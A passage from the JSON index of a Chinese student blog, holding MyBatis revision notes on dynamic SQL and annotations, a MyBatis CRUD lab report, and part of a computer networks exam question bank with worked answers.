SqlSessionFactoryBuilderSqlSessionFactoryBuilder对象是线程安全的，它一旦被创建，在整个应用程序执行期间都会存在。如果我们多次创建同一个数据库的SqlSessionFactory对象，那么该数据库的资源将很容易被耗尽。通常每一个数据库只创建一个SqlSessionFactory对象，所以在构建SqlSessionFactory对象时，建议使用单例模式。 SqlSessionSqlSession是Mybatis框架中另一个重要的对象，它是应用程序与持久层之间执行交互操作的一个单线程对象，主要作用是执行持久化操作。类似于JDBC中的connection，SqlSession对象包含了执行SQL操作的方法，由于其底层封装了JDBC连接，所以可以直接使用SqlSession对象来执行已映射的SQL语句。 动态SQL（直接看代码即可）动态SQL常用元素 元素 说明 判断语句，用于单条件判断 (、) 相当于Java中的switch…case…default语句，用于多条件判断 简化SQL语句中where的条件判断 可以灵活地去除多余的关键字 用于SQL语句的动态更新 循环语句，常用于in语句等列举条件中 条件查询操作if元素的应用在MyBatis中，元素是最常用的判断元素，它类似于Java中的if语句，主要用于 实现某些简单的条件判断。在实际应用中，我们可能会通过某个条件查询某个数据。例如， 要查找某个客户的信息，可以通过姓名或者年龄来查找客户，也可以不填写年龄直接通过 姓名来查找客户，还可以都不填写而查询出所有客户，此时姓名和年龄就是非必须条件。 类似于这种情况，在MyBatis中就可以通过元素来实现。 创建映射文件：创建映射文件CustomerMapper.xml，在映射文件中，根据客户姓名和年 龄组合条件查询客户信息，使用元素编写该组合条件的动态SQL。 1234567&lt;!– 该xml文件中只列出了if元素的动态SQL--&gt;&lt;if test=&quot;username !=null and username !=‘’“&gt;and username like concat(&#x27;%&#x27;,#&#123;username&#125;, &#x27;%&#x27;)&lt;/if&gt;&lt;if test=&quot;jobs !=null and jobs !=‘’“&gt;and jobs= #&#123;jobs&#125;&lt;/if&gt; choose、when、otherwise元素在使用元素时，只要test属性中的表达式为true，就会执行元素中的条件语句， 但是在实际应用中，有时只需要从多个选项中选择一个去执行。 例如下面的场景：“当客户名称不为空，则只根据客户名称进行客户筛选；当客户 名称为空，而客户职业不为空，则只根据客户职业进行客户筛选。当客户名称和客户职业 都为空，则要求查询出所有电话不为空的客户信息。” 针对上面情况，使用元素进行处理是不合适的。MyBatis提供了choose、when、otherwise元素进行处理，这三个元素往往组合在一起使用，作用相当于 Java语言中的if…else if…else。 在映射文件CustomerMapper.xml中，添加使用、、元素 执行上述情况的动态SQL。 12345678910&lt;!-- 只展示三个组合元素的部分--&gt;&lt;choose&gt;&lt;when test=&quot;username !=null and username !=&#x27;&#x27;&quot;&gt;and username like concat(&#x27;%&#x27;,#&#123;username&#125;, &#x27;%&#x27;)&lt;/when&gt;&lt;when test=&quot;jobs !=null and jobs !=&#x27;&#x27;&quot;&gt;and jobs= #&#123;jobs&#125;&lt;/when&gt;&lt;otherwise&gt;and phone is not null&lt;/otherwise&gt;&lt;/choose&gt; where、trim元素where、trim 使用场景： 在映射文件中，编写的SQL后面加入了“where 1=1”的条件的话，既保证了 where后面的条件成立，又避免了where后面第一个词是and或者or之类的关键字。 例如下面这条Mybatis拼接出的SQL语句是不正确的。 12select * from t_customer where and username like concat(&#x27;%&#x27;,?,&#x27;%&#x27;) and jobs = #&#123;jobs&#125; 上述SQL语句中，where后直接跟的是and，这在运行时会报SQL语法错误，针对这 种情况，可以使用MyBatis提供的where元素和trim元素进行处理。 12345678910&lt;select id=&quot;findCustomerByNameAndJobs&quot;parameterType=&quot;com.itheima.pojo.Customer&quot;resultType=&quot;com.itheima.pojo.Customer&quot;&gt;select * from t_customer&lt;where&gt;&lt;if test=&quot;username !=null and username !=&#x27;&#x27;&quot;&gt;and username like concat(&#x27;%&#x27;,#&#123;username&#125;, &#x27;%&#x27;)&lt;/if&gt;&lt;if test=&quot;jobs !=null and jobs !=&#x27;&#x27;&quot;&gt;and jobs= #&#123;jobs&#125;&lt;/if&gt;&lt;/where&gt;&lt;/select&gt; 上述代码配置中，where元素会自动判断由组合条件拼装的SQL语句，只有where元素内的某一个或多个条件成立时，才会在拼接SQL中加入where关键字，否 则将不会添加；即使where之后的内容有多余的“AND”或“OR”,where元素也会自动将他们去除。 12345678910&lt;select id=&quot;findCustomerByNameAndJobs&quot;parameterType=&quot;com.itheima.pojo.Customer&quot;resultType=&quot;com.itheima.pojo.Customer&quot;&gt;select * from t_customer&lt;trim prefix=&quot;where&quot; prefixOverrides=&quot;and&quot; &gt;&lt;if test=&quot;username !=null and username !=&#x27;&#x27;&quot;&gt;and username like concat(&#x27;%&#x27;,#&#123;username&#125;, &#x27;%&#x27;)&lt;/if&gt;&lt;if test=&quot;jobs !=null and jobs !=&#x27;&#x27;&quot;&gt;and jobs= #&#123;jobs&#125;&lt;/if&gt;&lt;/trim&gt;&lt;/select&gt; 上述配置代码中，trim元素的作用是去除一些多余的前缀字符串，它的prefix属 性代表的是语句的前缀（where），而prefixOverrides属性代表的是需要去除的前缀字 符串（SQL中的“AND”或“OR”）。 更新操作在Hibernate框架中，如果想要更新某一个对象，就需要发送所有的字段给持久化 对象，然而在实际应用中，大多数情况下都是更新某一个或几个字段。如果更新的每一条 数据都要将其所有的属性都更新一遍，那么执行效率是非常差的。为了解决更新数据的效 率问题，MyBatis提供了set元素。set元素主要用于更新操作，它可以在动态SQL 语句前输出一个SET关键字，并将SQL语句中最后一个多余的逗号去除。set元素与if 元素结合可以只更新需要更新的字段。 在映射文件CustomerMapper.xml中，添加使用元素执行更新操作的动态SQL。 123456789&lt;update id=&quot;updateCustomerBySet”parameterType=&quot;com.itheima.pojo.Customer&quot;&gt;update t_customer&lt;set&gt;&lt;if test=&quot;username !=null and username !=&#x27;&#x27;&quot;&gt;username=#&#123;username&#125;,&lt;/if&gt;&lt;if test=&quot;jobs !=null and jobs !=&#x27;&#x27;&quot;&gt; jobs=#&#123;jobs&#125;,&lt;/if&gt;&lt;if test=&quot;phone !=null and phone !=&#x27;&#x27;&quot;&gt;phone=#&#123;phone&#125;,&lt;/if&gt;&lt;/set&gt; where id=#&#123;id&#125;&lt;/update&gt; 复杂查询操作foreach元素中的属性： List类型：若入参为单参数且参数类型是一个List，collection属性值为list 数组类型：若入参为单参数且参数类型是一个数组，collection属性值为array。 Map类型：若传入参数为多参数，就需要把参数封装为一个Map进行处理，collection属性值 为Map。若传入参数为多参数，就需要把参数封装为一个Map进行处理，collection属性 值为Map。 foreach元素迭代数组在映射文件CustomerMapper.xml中，添加使用元素迭代数组执行批量查询操作 的动态SQL。 1234567&lt;select id=&quot;findByArray&quot; parameterType=&quot;java.util.Arrays&quot;resultType=&quot;com.itheima.pojo.Customer&quot;&gt;select * from t_customer whereid in&lt;foreach item=&quot;id&quot; index=&quot;index&quot; collection=&quot;array&quot;open=&quot;(&quot; separator=&quot;,&quot; close=&quot;)&quot;&gt; #&#123;id&#125;&lt;/foreach&gt;select&gt; foreach元素迭代List在映射文件CustomerMapper.xml中，添加使用元素迭代List集合执行批量查询 操作的动态SQL。 12345678&lt;select id=&quot;findByList&quot; parameterType=&quot;java.util.Arrays&quot;resultType=&quot;com.itheima.pojo.Customer&quot;&gt;select * from t_customer where id in&lt;foreach item=&quot;id&quot; index=&quot;index&quot; collection=&quot;list&quot;open=&quot;(&quot; separator=&quot;,&quot; close=&quot;)&quot;&gt;#&#123;id&#125;&lt;/foreach&gt;&lt;/select&gt; foreach元素迭代Map在映射文件CustomerMapper.xml中，添加使用元素迭代Map集合执行批量查询 操作的动态SQL。 1234567&lt;select id=&quot;findByMap&quot; parameterType=&quot;java.util.Map&quot;resultType=&quot;com.itheima.pojo.Customer&quot;&gt;select * from t_customer where jobs=#&#123;jobs&#125; and id in&lt;foreach item=&quot;roleMap&quot; index=&quot;index&quot; collection=&quot;id&quot; open=&quot;(&quot;separator=&quot;,&quot; close=&quot;)&quot;&gt; #&#123;roleMap&#125;&lt;/foreach&gt;&lt;/select&gt; Mybatis常用注解@Select注解示例： 创建类：创建持久化类Worker，在Worker类中定义id、员工姓名、年龄、性别、工号等属 性以及属性对应的getter/setter方法。 12345678910public class Worker &#123;private Integer id; private String name; private Integer age;private String sex;private String worker_id;// 省略getter/setter方法@Overridepublic String toString() &#123;return &quot;Worker&#123;&quot; + &quot;id=&quot; + id + &quot;, name=&quot; + name +&quot;, age=&quot; + age + &quot;, sex=&quot; + sex + &quot;, worker_id=&quot; + worker_id + &#x27;&#125;&#x27;;&#125;&#125; 编写查询方法 1234567package com.itheima.dao;import com.itheima.pojo.Worker;import org.apache.ibatis.annotations.Select;public interface WorkerMapper &#123;@Select(&quot;select * from tb_worker where id = #&#123;id&#125;&quot;)Worker selectWorker(int id);&#125; 加载配置文件：：在核心配置文件mybatis-config.xml中的元素下引入 WorkerMapper接口，将WorkerMapper.java接口加载到核心配置文件中。 1&lt;mapper class=&quot;com.itheima.dao.WorkerMapper&quot;/&gt; @Insert注解 添加注解：在WorkerMapper接口中添加向tb_worker数据表插入数据的方法 insertWorker()，并在方法上添加@Insert注解 123@Insert(&quot;insert into tb_worker(name,age,sex,worker_id)&quot;+&quot;values(#&#123;name&#125;,#&#123;age&#125;,#&#123;sex&#125;,#&#123;worker_id&#125;)&quot;)int insertWorker(Worker worker); @Update注解 添加注解：在WorkerMapper接口中添加更新tb_worker表中数据的方法，并在方法上添加 @Update注解。 123@Update(&quot;update tb_worker set name = #&#123;name&#125;,age = #&#123;age&#125; &quot;+&quot;where id = #&#123;id&#125;&quot;)int updateWorker(Worker worker); @Delete注解 添加注解：在WorkerMapper接口中添加删除数据库中数据的方法，并在方法上添加 @Delete注解。 12@Delete(&quot;delete from tb_worker where id = #&#123;id&#125;&quot;)int deleteWorker(int id); @Param注解 下面通过一个案例演示@Param注解的使用，该案例要求根据员工的id和姓名查询员工信息， 案例具体实现步骤如下。 添加注解：在WorkerMapper接口中添加多条件查询的方法。 1234@Select(&quot;select * from tb_worker where id = #&#123;param01&#125;and name = #&#123;param02&#125;&quot;)Worker selectWorkerByIdAndName(@Param(&quot;param01&quot;) int id,@Param(&quot;param02&quot;) String name); Mybatis映射文件中常用元素 属性 说明 mapper 映射文件的根元素，该元素只有一个namespace属性（命名空间）。 cache 配置给定命名空间的缓存 cache-ref 从其他命名空间引用缓存配置。 resultMap 描述数据库结果集和对象的对应关系。 sql 可以重用的SQL块，也可以被其他语句使用。 insert 用于映射插入语句。 delete 用于映射删除语句。 update 用于映射更新语句。 select 用于映射查询语句。 mapper元素中namespace属性作用namespace属性有两个作用： 用于区别不同的mapper，全局唯一 绑定DAO接口，即面向接口编程。当namespace绑定某一接口之后，可以不用写该接口的实现类，Mybatis会通过接口的全限定名查找到对应的mapper配置来执行SQL语句，因此namespace的命名必须跟接口同名。 mapper元素如何区别不同的XML文件在不同映射文件中，mapper元素的子元素的id可以相同，Mybatis通过mapper元素的namespace属性值和子元素id联合区分不同的Mapper.xml文件。接口中的方法与映射文件中SQL语句id一一对应。","comments":true,"categories":[{"name":"计算机基础","slug":"计算机基础","permalink":"http://1905060202.github.io/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80/"}],"tags":[{"name":"前端","slug":"前端","permalink":"http://1905060202.github.io/tags/%E5%89%8D%E7%AB%AF/"},{"name":"期末复习","slug":"期末复习","permalink":"http://1905060202.github.io/tags/%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/"},{"name":"web","slug":"web","permalink":"http://1905060202.github.io/tags/web/"},{"name":"后端","slug":"后端","permalink":"http://1905060202.github.io/tags/%E5%90%8E%E7%AB%AF/"}]},{"title":"高级Web技术实验(一)","date":"2022-04-08T02:00:40.000Z","path":"2022/04/08/高级Web技术实验-一/","text":"高级Web技术实验一掌握 MyBatis 的环境搭建、核⼼配置⽂件、映射⽂件，学会使⽤基于 xml 和基于注解的 MyBatis 进⾏关 系数据库的增删查改操作。 实验要求1，技术选型：Java + Spring + MyBatis；推荐使⽤的数据库为 MySQL，引擎为 innoDB 存储引擎； 2， 实验结果在 Test 包中创建测试类，将实验结果直接输出到控制台，暂时不需要使⽤前端⻚⾯进⾏展示； 3，提交实验报告，项⽬代码推荐提交⾄ Github 并在实验报告中给出项⽬的仓库地址。 实验过程在mysql中建立mybatis库以及两张表1.我们通过Navicat建立mabatis_test库： 2.在navicat中操作，建立题目要求的两张表格： c_course: c_school: 数据库的建表工作已经完成，下面就是对spring以及mybatis进行配置！ 配置mybatis1.通过idea创建maven项目，在resources文件夹中创建 mybatis-config.xml核心配置文件！ 2.建立pojo与mapper pojo对应实体类，里面有属性与get set toString等方法。 其中CourseMapper.xml： 3.测试结果： 插入课程： 查询id=2的课程信息： 查询所有计算机学院开设的课程信息： 将id=4这门课程的课时数修改为32+8=40： 输出所有的学院开设的课程信息： 实验代码CourseMapper： 1234567891011121314package com.yaning.mybatis.mapper;import com.yaning.mybatis.pojo.c_course;import java.util.List;public interface CourseMapper &#123; int insertCourse(); c_course selectCourse(); List&lt;c_course&gt; selectAllcourseByCS(); int updateCourse(); List&lt;c_course&gt; selectAllCourse();&#125; CourseMapper.xml: 123456789101112131415161718192021222324252627&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;!DOCTYPE mapper PUBLIC &quot;-//mybtis.org//DTD Mapper 3.0//EN&quot; &quot;http://mybatis.org/dtd/mybatis-3-mapper.dtd&quot;&gt;&lt;mapper namespace=&quot;com.yaning.mybatis.mapper.CourseMapper&quot;&gt;&lt;insert id=&quot;insertCourse&quot;&gt; insert into c_course values(5,&#x27;大数据存储&#x27;,&#x27;32&#x27;,&#x27;1&#x27;)&lt;/insert&gt;&lt;!-- 查询必须设计resultType或resultmap--&gt;&lt;!-- 字段名和属性名不一致用resultmap--&gt; &lt;select id=&quot;selectCourse&quot; resultType=&quot;com.yaning.mybatis.pojo.c_course&quot;&gt; select * from c_course where id = 2 &lt;/select&gt; &lt;select id=&quot;selectAllcourseByCS&quot; resultType=&quot;com.yaning.mybatis.pojo.c_course&quot;&gt; select * from c_course where schools=&#x27;1&#x27; &lt;/select&gt; &lt;update id=&quot;updateCourse&quot;&gt; update c_course set hours = 40 where id =4 &lt;/update&gt; &lt;select id=&quot;selectAllCourse&quot; resultType=&quot;com.yaning.mybatis.pojo.c_course&quot;&gt; select * from c_course &lt;/select&gt;&lt;/mapper&gt;","comments":true,"categories":[{"name":"计算机基础","slug":"计算机基础","permalink":"http://1905060202.github.io/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80/"}],"tags":[{"name":"前端","slug":"前端","permalink":"http://1905060202.github.io/tags/%E5%89%8D%E7%AB%AF/"},{"name":"web","slug":"web","permalink":"http://1905060202.github.io/tags/web/"},{"name":"后端","slug":"后端","permalink":"http://1905060202.github.io/tags/%E5%90%8E%E7%AB%AF/"}]},{"title":"计算机网络题库","date":"2022-01-06T06:11:57.000Z","path":"2022/01/06/计算机网络题库/","text":"计算机网络期末复习谨以此文,纪念博文破百,以及建站满一年. 概述简答题 1.试述分组交换的要点 分组交换的要点包括：分组转发、分段重复、独立选路。分组交换最主要的特点就是采用了存储转发技术。将完整的报文分割成为较小的数据段，在每个数据段前面加上必要的控制信息组成首部，就构成了分组。分组是在互联网中传送的数据单元。 2.互联网的两大组成部分的特点是什么？他们的工作方式各有什么特点？ 边缘部分：由所有连接在互联网上的主机构成。这部分是用户直接使用的没用来通信和共享资源。 核心部分：由大量的网络和连接这些网络的路由器组成。这部分是为边缘部分提供服务的。 在边缘部分的端系统通信可划分为两个大类：C/S与P2P模式。核心部分工作方式有两种：一种是路由器转发分组，另一种是路由器之间不断交换路由信息。 3.协议和服务有什么区别？有何关系？ 协议是控制对等实体之间的通信规则，是水平的。服务是下层通过接口向上层提供的功能，是垂直的。 协议的实现保证了能够向上一层提供服务。要实现本层协议还需要使用下层提供的服务。 4.网络协议的三个要素是什么？各有什么含义？ 语法：数据与控制信息的结构或格式 语义：需要发出何种控制信息，完成何种动作以及做出何种相应 同步：事件实现顺序的详细说明 5.在OSI/RM模型中，各层都有差错控制，指出以下每种差错发生在OSI/RM的哪些层中？ 噪声使传输链路上的一个0变成1 一个分组被传输到错误的目的站 收到一个序号错误的帧 一台打印机正在打印，突然收到一个错误指令，要打印回本行的开始位置 物理层 网络层 数据链路层 应用层 名词解释 试解释以下名词：协议栈、实体、对等层、协议数据单元、服务访问点、客户、服务器、客户-服务器方式。 协议栈：由于计算机网络体系结构采用了分层结构，这一层层的协议画起来很像堆栈 实体：表示任何可以发送和接收信息的硬件或软件进程 对等层：在网络体系结构中，通信双方实现同样功能的层 协议数据单元：通常记为PDU，对等层实体进行信息交互的数据单元 服务访问点：通常记为SAP，在同一系统中相邻两层的实体进行信息交换的地方，是一个抽象概念。 客户：在计算机网络中进行通信的应用进程中的服务请求方 服务器：在计算机网络中进行通信的应用进程中的服务提供方 客户-服务器方式：这种方式所描述的是进程之间服务的请求方和服务的提供方的关系 计算题 假定网络的利用率达到了90%，试估算一下现在的网络时延是它的最小值的多少倍？ 如果令D0表示网络空闲时的时延，D表示网络当前的时延，那么在适当的假定条件下，可以用下面的简单公式来表示D，D0和利用率U之间的关系。$$D = D0/(1-U)$$故网络时延是最小的十倍. 物理层简答题 1.物理层要解决哪些问题?物理层主要的特点是什么? 物理层要解决的问题是: 如何能在连接各种计算机的传输媒体上传输数据比特流 尽可能地屏蔽掉传输媒体和通信手段的差异,使物理层上的数据链路层感受不到这些差异 物理层主要特点包括: 机械特性 电气特性 功能特性 过程特性 2.物理层的接口有哪几方面的特性?包含哪些内容? 物理接口协议中的物理接口有四个特性,分别是机械特性,电气特性,功能特性与过程特性. 机械特性:指接口所有的接线器的形状和尺寸,引线数目和排列,固定和锁定装置等等 电气特性:指明在接口电缆的各条线上出现的电压的范围 功能特性:指明某条线上出现的某一电平的电压表示何意 过程特性:对于不同功能的各种可能事件的出现顺序 3.数据在信道中的传输速率受哪些因素的限制?信噪比能否任意提高?香农公式在数据通信中的意义是什么?bit/秒和码元/秒有什么区别? 码元传输速率受奈式准则的限制,信息传输速率受香农公式的限制 信噪比不能任意提高 香农公式在数据通信中的意义是:只要信息传输速率低于信道极限的传信率,就可实现无差传输. bit/s是信息传输速率的单位.码元传输速率也成为调制速率,一个码元不一定对应于一个bit 4.为什么要使用信道复用技术?常用的信道复用技术有哪些? 为了通过共享信道,最大限度提高信道利用率 频分多路复用\\时分多路复用\\码分多路复用\\波分多路复用 5.试写出以下英文缩写的全文,并给出解释:FDM,TDM.,STDM,WDM,CDMA FDM:频分复用,给每个信号分配唯一的载波频率并通过单一媒体来传输多个独立信号的方法. TDM:时分复用,把多个信号复用到单个硬件传输信道,它允许每个信号在很短的时间内使用信道.接着再让写一个信号使用. WDM:波分复用就是光的频分复用 CDMA:码分多址,即码分复用,每一个用户可以在同样的时间使用同样的频带进行通信 STDM:统计时分复用,是一种改进的时分复用,动态划分时间间隔. 共有四个站进行码分多址CDMA通信.四个站的码片序列为: A:(-1 -1 -1 +1 +1 -1 +1 +1) B:(-1 -1 +1 -1 +1 +1 +1 -1) C:(-1 +1 -1 +1 +1 +1 -1 -1) D:(-1 +1 -1 -1 -1 -1 +1 -1) 现在收到这样的码片序列:S:(-1 +1 -3 +1 -1 -3 +1 +1),问哪个站发送了数据?发送的是0还是1? S·A:(+1 -1 +3 +1 -1 +3 +1 +1)/8=1 S·B:(+1 -1 -3 -1 -1 -3 +1 -1) /8=-1 S·C:(+1 +1 +3 +1 -1 -3 -1 -1)/8=0 S·D:(+1 +1 +3 -1 +1 +3 +1 -1)/8=1 A发送1,B发送0,C无法送,D发送1. 计算题 1.假定某信道受奈式准则限制的最高码元速率为20000码元/秒.如果采用振幅调制,把码元的振幅划分为16个不同的等级来传输,那么可以获得多高的数据率?(bit/s) $$16 = 2^4$$ 根据奈式准则:$$C = Wlog_2(M)$$可知:$$C=20000log_2(16)=20000*4=80000$$故最高速率可达到80000bits/s 2.假定要用3kHz带宽的电话信道传送64kbit/s的数据(无差错传输),试问这个信道具有多高的信噪比(分别用比值和分贝来表示)?这个结果说明什么? 根据香农公式:$$C = Wlog_2(1+\\frac{S}{N} )$$由于W=3kHz,C为64kbits/s,即:$$3log_2(1+\\frac{S}{N})=64kbit/s$$于是S/N得2^(64/3)-1=2642199,再由信噪比转换公式可得:$$10*log_{10}(\\frac{S}{N})$$信噪比为64.2dB,这个结果说明此信道得信噪比很高. 3.用香农公式计算一下,假定信道带宽为3100Hz,最大信息传输速率为35kbits/s,那么若想使得最大信息传输速率增加60%,问信噪比S/N应增大到多少倍?如果在刚才的计算基础上将信噪比S/N再增大10倍,问最大信息传输率能否再增加20%? 根据香农公式,可知:$$C = W*log_{2}(1+\\frac{S}{N})$$当最大信息传速率增大60%,即C2=1.6C1.$$\\frac{S}{N} = 2^{\\frac{C}{W}}-1$$经计算可知,信噪比应增大到100倍.如果在此基础上再增加信噪比,最大信息率只能在增加18.5%左右 数据链路层简答题 1.数据链路层中的链路控制包括哪些功能?试讨论数据链路层做成可靠的链路层有哪些优点和缺点? 链路控制主要功能:链路管理,封装成帧,透明传输,流量控制,差错检测,寻址等 优点是:可以使网络中的某个节点及早发现传输中出了差错,因而可以通过数据链路层重传来纠正这个差错.对于严重干扰的信道,可靠的链路层可以将重传范围约束在局部链路,防止全网络的传输效率受损, 缺点是:有时高层协议使用的是不可靠的传输协议UDP.UDP并不要求重传有差错的数据,在这种情况下,如果做成可靠的数据链路层,反而会增大开销,影响传输效率. 2.网络适配器的作用是什么?网络适配器工作在哪一层? 网络适配器(即网卡)用来实现数据链路层和物理层这两层的协议的硬件和软件,能进行数据的串并转换,有存储芯片,能实现以太网协议 网络适配器工作在OSI/RM体系结构中的数据链路层和物理层,TCP/IP体系结构的网络接口层. 3.如果数据链路层不进行封装成帧,会发生什么问题? 如果在数据链路层不进行封装成帧,那么数据链路层在接收到一些数据时,就无法知道对方传送的数据中哪些是信息,哪些是数据,甚至数据中有没有差错也不知道.数据链路层也不知道数据传输结束了没有,因此不知道应当什么时候把收到的数据交给上一层. 4.PPP协议使用同步传输技术传送比特串0110111111111100,试问经过零比特填充后会变成怎么样的比特串?若接受端收到的PPP帧的数据部分是0001110111110111110110,问删除发送端加入的零比特后会变成怎样的比特串? 011011111011111000(其中黑体为填充的0) 000111011111[0]11111[0]110(其中[]起来的是删除的0) 5.数据链路层的三个基本问题,封装成帧,差错检测,透明传输,为什么都必须加以解决? 封装成帧是分组交换的必然要求 透明传输是避免二进制比特流中出现与帧定界符相同的模式,使得节点错误识别帧 差错检测是为了避免收到错误的信息和防止信道中出现的无效数据帧浪费后续路由上传输和处理资源 6.一个PPP帧的数据部分(用十六进制写出)是7D 5E FE 27 7D 5D 7D 5D 65 7D 5E,请问真正的数据是什么?用十六进制写出. ppp帧定界符为01111110(十六进制为7E),转换原则: 当信息中出现每一个7E字节转变为2字节序列(7D,5E); 当信息中出现每一个7D字节转变为2字节序列(7D,5D); 所以本题中的真正数据为去掉转义字符后的数据,题目中转义字符有(7D 5E) FE 27 (7D 5D) (7D 5D) 65 (7D 5E). 故真正的数据是:7E FE 27 7D 7D 65 7E 7.局域网的主要特点是什么?为什么局域网采用广播通信方式而广域网不采用呢? 局域网的特点有:局域网共享传输信道,通常网络为一个单位所有,且地理范围和站点数目均有限 在局域网中各站点通常进行一对多访问,随机使用信道,共享通信媒体,采用广播方式是最合适的.且局域网中站点较少,带宽相对较大,也适宜广播通信.而广域网中用户数量较多,若采用广播通信,会造成广播风暴,降低网络性能,甚至整个网络无法使用. 8.数据率为10Mbits/s的以太网在物理媒体上的码元传输速率是多少码元/秒 码元传输速率就是波特率,以太网使用曼彻斯特编码,这意味着发送的每一位都有两个信号周期 .所以数据率 为10Mb/s的以太网在物理媒体上的码元传速率是20M码元每秒. 9.以太网使用CSMA/CD协议是以争用方式接入到共享信道.这与传统的时分复用TDM相比优缺点如何? 传统的时分复用TDM是静态时隙分配,均匀高负荷时信道利用率高,低负荷或不均匀时资源浪费较大.CSMA/CD协议采用”先听后说,边听边说”机制.在网络负荷较轻时,协议灵活,利用率高,在网络负荷较重时,冲突较大,效率下降. 11.10Mbit/s以太网升级到100Mbit/s,1Gbit/s和10Gbit/s时,都需要解决哪些技术问题?为什么以太网能够在发展过程中淘汰掉自己的竞争对手,并使自己的应用范围从局域网一直扩展到城域网和广域网? 升级要解决的技术问题有:使参数α保持较小的数值,可以通过减小最大电缆长度或增大帧的最小长度来实现. 大道至简 计算题 1.假定1km长的CSMA/CD网络的数据率为1Gb/s.设信号在网络上的传播速率为200000km/s.求能够使用此协议的最短帧长. 1km长的CSMA/CD网络的端到端传播时延τ=1/200000=5μs,2τ=10μs.在此时间要发送(1Gbit/s)*10μs=10000bit. 2.要发送的数据为101110.采用CRC的生成多项式P(X)=X^3+1.试求应该添加在数据后面的余数. 根据生成多项式最高阶补0,最高阶是几就补上几个0.补完后有101110000. 作二进制除法(异或运算)101110000除以1001,相当于异或运算,得到余数011(因为最高项次数为3) 3.有10个站连接到以太网上.试计算以下三种情况每一个站所能得到的带宽 ①10个站都连接到一个10Mbit/s以太网集线器 ②10个站都连接到一个100Mbit/s以太网集线器 ③每个站独占10Mbit/s 1.10个站共享,10/10=1Mbit/s 2.10个站共享100Mbit/s,每个站得到100/10=10Mbit/s 3.每个站独占10Mbit/s 网络层简答题 1.网络层向上提供的服务有哪两种?试对比其优缺点 数据报服务和虚电路服务 对比的方面 虚电路服务 数据报服务 思路 可靠通信应当由网络来保证 可靠通信应由用户主机来保证 连接的建立 必须有 不需要 终点地址 仅在连接建立阶段使用,每个分组使用短的虚电号 每个分组都有终点的完整地址 分组的转发 属于同一条虚电路的分组均按照同一路进行转发 每个分组独立选择路由进行转发 当节点出故障时 所有通过出故障的节点的虚电路均不能工作 出故障的节点可能会丢失分组,一些路由可能会发生变化 分组的顺序 总是按发送顺序到达终点 到达终点是不一定按发送顺序 端到端的差错处理和流量控制 可以由网络负责,也可以由用户主机负责 由用户组主机负责 2.网络互连有何实际意义?进行网络互连时,有哪些共同的问题需要解决? 单一的网络无法满足各种用户的多种需求,因此,将许多类型不同的物理网络连接到一起,可以实现更大范围的通信.实际中,使用TCP/IP协议,定义了一种抽象的网络,隐藏了互连的各种不同物理网络细节,使得互联后的网络像一个单一的大网络 需要解决的问题:不同的寻址方案,不同的最大分组长度,不同的网连入机制,不同的超时控制,不同的差错控制方法,不同的路由选择技术等等. 3.试说明IP地址与硬件地址的区别,为什么要使用这两种不同的地址? 从层次的角度来看,物理地址是数据链路层和物理层使用的地址,而IP地址是网络层和以上各层使用的地址,是一种逻辑地址. IP地址是不能直接用来通信的,在实际网络的链路传输数据帧时最终还是必须使用硬件地址,但全世界存在着各种各样的网络,它们使用不同的硬件地址,要使这些异构的网络能够互相通信就必须进行非常复杂的硬件地址转换工作.IP地址承担起了统一的责任. 4.①子网掩码为255.255.255.0代表什么意思? ②一网络的子网掩码为255.255.255.248,问该网络能连接多少个主机? ③一A类网络和一B类网络的子网号subnet-id分别为16个1和8个1,问这两个子网掩码有何不同? ④一个B类地址的子网掩码是255.255.240.0,试问在其中每一个子网上的主机数最多是多少? ⑤一A类网络的子网掩码为255.255.0.255;它是否为一个有效子网掩码? ⑥某个IP地址的十六进制表示C2.2F.14.81,试将其转化为点分十进制形式,这个地址是哪一类IP地址? ⑦C类网络使用子网掩码有无实际意义?为什么? 有三重含义,其一是一个A类网的子网掩码,对于A类网络的IP地址,前8位表示网络号,后24位表示主机号,使用子网掩码255.255.255.0表示前8位为网络号,中间16位用于子网的划分,最后8位为主机号.第二种情况为一个B类网络,对于B类网络的IP地址,前16位表示网络号.后16位表示主机号,使用子网掩码255.255.255.0表示前16位为网络号,中间8位用于子网划分,最后8位为主机号.第三种情况为一个C类网,这个子网掩码为C类网的默认子网掩码. 255.255.255.248即11111111.11111111.11111111.11111000.掩码位数为29,每一个子网上的主机为2^3=8台,理论上该网络能够连接8个主机但是扣除全1和全0的情况后,该网络实际能够连接6个主机. A类网络:11111111.11111111.11111111.00000000,则子网掩码为255.255.255.0.B类网络:11111111.11111111.11111111.00000000,则子网掩码为255.255.255.0.可见这两个网络的子网掩码一样,但是他们的子网数量不同. IP地址的第三个字节是(240)10=(128+64+32+16)10=(11110000)2.子网掩码为:255.255.240.0,主机位共有12位,最大主机数位2^12=4094个(扣除了全为1和全为0) 他是一个有效的子网掩码,但是不推荐这么用,因为子网中的1是不连续的 C2=16×12+2,2F=2×16+15,14=1×16+4,81=8×16+1,转换位IP2进制地址是:11000010.00101111.00010100.10000001.前面是110,这是一个C类网络. 有实际意义.C类子网IP地址的32位中,前24位用于确定网络号,后8位用于确定主机号,如果划分子网.可以选择后8位中的高位,这样做可以进一步划分网络,并且不增加路由表的内容,但是代价是主机数量减少. 5.一个数据报长度为4000字节(固定首部长度).现在经过一个网关传送,但此网络能够传送的最大数据长度为1500字节.试问应当划分几个短些的数据报片?各数据报片的数据字段长度,偏移字段和MF标志应为何数值? 4000字节的IP数据报,减去20字节的固定首部,所含数据长度是3980字节.而网络能够传送的最长数据长度为1500字节,即数据链路层的数据帧中包含的数据最大是1500字节,该数据长度是数据帧中封装IP数据报的最大长度(包括首部和数据,即总长度),于是每个分片数据字段的长度只能为1500-20=1480bit.所以分为三个数据报片.每片数据字段长度为1480,1480和1020字节.偏移字段的值分别为0,185和370.MF字段分别为1,1,0 数据字段 MF 片偏移 片1 1480 1 0 片2 1480 1 185 片3 1020 0 370 MF为1代表后继有人,为0代表无人.片偏移计算为:起始长度/8;三片分别为:0/8与1480/8与2960/8; 6.分两种情况(使用子网掩码和使用CIDR)写出互联网的IP层查找路由算法 第一种情况:使用子网掩码 从收到的数据报首部提取目的IP地址D 